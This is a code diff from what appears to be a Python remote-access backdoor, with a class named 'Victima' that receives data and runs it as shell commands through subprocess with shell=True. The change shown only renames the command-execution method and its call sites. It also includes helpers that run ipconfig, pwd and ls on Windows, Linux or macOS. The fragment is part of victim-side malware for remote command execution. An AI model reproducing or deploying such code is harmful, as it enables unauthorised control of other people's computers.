@@ -80,7 +80,7 @@ class Victima(object):
 		return msg
 
 
-	def enviar_completo(self,datos):
+	def enviar_comandos(self,datos):
 		comando = subprocess.Popen ((datos).strip(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.STDOUT, stdin = subprocess.PIPE, universal_newlines=True)
 
 		salida = [x for x in comando.stdout.readlines()]
@@ -225,7 +225,7 @@ class Victima(object):
 				break
 
 			else:
-				self.enviar_completo(datos)
+				self.enviar_comandos(datos)
 
 			datos = self.recibir()
 
@@ -386,10 +386,10 @@ class Victima(object):
 	def ifconfig(self,plataforma):
 		
 		if (plataforma=="win"):
-			self.enviar_completo("ipconfig")
+			self.enviar_comandos("ipconfig")
 
 		elif (plataforma=="linux") or (plataforma=="mac"):
-			self.enviar_completo("ip addr")
+			self.enviar_comandos("ip addr")
 
 		return
 
@@ -399,20 +399,20 @@ class Victima(object):
 	def pwd(self):
 
 		if (plataforma=="win"):
-			self.enviar_completo("echo %cd%")
+			self.enviar_comandos("echo %cd%")
 
 		elif (plataforma=="linux") or (plataforma=="mac"):
-			self.enviar_completo("pwd")
+			self.enviar_comandos("pwd")
 
 		return
 
 	def ls(self):
 
 		if (plataforma=="win"):
-			self.enviar_completo("dir")
+			self.enviar_comandos("dir")
 
 		elif (plataforma=="linux") or (plataforma=="mac"):
-			self.enviar_completo("ls")
+			self.enviar_comandos("ls")
 
 		return
 
